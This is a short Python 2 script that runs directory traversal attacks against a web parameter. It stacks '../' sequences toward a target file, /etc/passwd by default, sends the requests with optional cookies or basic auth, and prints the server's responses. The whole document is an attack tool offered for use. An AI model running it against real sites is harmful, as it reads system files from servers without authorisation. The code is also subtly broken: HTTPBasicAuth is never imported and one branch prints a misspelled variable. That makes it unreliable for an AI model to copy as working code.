"""
Description:
Simple script to attempt variety of directory traversal attacks against a site
hosted on a linux server using the GET HTTP_REQUEST

Example:

Known Issues:
  * Loose parameter checking, e.g. URL

Todo:
  * Implement throttling and timeouts
  * Implement custom headers in request
  * Implement authenticated requests digest, NTLM, etc.
  * Implement for POST HTTP_REQUESTS
  * Implement support for proxies
"""


import requests
import sys


# Global (module) variables
auth = None
cookies_raw = None
depth = 3
file = "/etc/passwd"
password = None
payloads = []
pre = ".."
response = None
url = None
username = None


def print_usage():
  """
  Prints the usage information

  Args:
    None

  Yields:
    None

  Returns:
    None
  """

  print "usage:"
  print "python", sys.argv[0], "<url> <file> <depth> [<cookies>|[<username> <passwd>]]"
  print "  url - is the url of the site with parameters"
  print "  file - is the file to traverse to"
  print "  depth - is the depth to attempt traversal to"
  print "  cookie - string of semi-colon separated key=value of cookies"
  print "  username password - optional username or password for basic auth"
  print "example:", sys.argv[0], "\"https://www.example.com/view=1&file_path=\" \"/etc/passwd\" 3"


def print_response( response ):
  """
  Prints the requests response details to stdout

  Args:
    req - the requests response object

  Yields:
    None

  Returns:
    None
  """
  # TODO: Probably put a try here to handle failed requests approriately
  print "--------------------------------------------------------------------------------"
  print "url: ", response.url
  print "--------------------------------------------------------------------------------"
  print "status_code: ", response.status_code
  print "headers: ", response.headers
  print "encoding: ", response.encoding
  print "page: ", response.text

#
# Main entry point
#

# Check parameters
try:
  if (len( sys.argv )) < 4:
    print "error: invalid arguments"
    print_usage()
    sys.exit()

  else:
    url = sys.argv[1]
    file = sys.argv[2]
    depth = int(sys.argv[3])

    if not (url.endswith( "=" )) or not (url.startswith( "http" )):
      print "error: invalid url"
      print_usage()
      sys.exit()

    if (not (file.startswith( "/" ))) or (len( file ) < 2) or file.endswith( "/" ):
      print "error: invalid filepath"
      print_usage()
      sys.exit()

    if ( depth <= 0 ):
      print "error: invalid depth specified"
      print_usage()
      sys.exit()

    if len( sys.argv ) == 5:
      cookies_raw = sys.argv[4];

    elif len( sys.argv ) == 6:
      username = sys.argv[4]
      password = sys.argv[5]

except Exception as e:
  print sys.exc_info()
  sys.exit()

# Initialise payloads
for i in xrange(0, depth):
  payloads.append(pre+file)
  pre += "/.."
  # TODO: attempt basic, encode, double-encode, null(%00) terminate payload

# Construct request and send to server
# TODO: put try here to catch timeout and other errors and failures
if (username is not None) and (password is not None):
  for payload in payloads:
    response = requests.get(url+payload, auth=HTTPBasicAuth(username, password))
    print_response( response )

elif cookies_raw is not None:
  cookies = {}
  cookies_split = cookies_raw.split( ';' )

  for cookie_single in cookies_split:
    (cookie_name, sign, cookie_value) = cookie_single.partition( '=' )
    cookies[cookie_name] = cookie_value

  for payload in payloads:
    response = requests.get(url+payload, cookies=cookies)
    print_response( response )

else:
  for payload in payloads:
    response = requests.get( url+payload )
    print_response( respone )
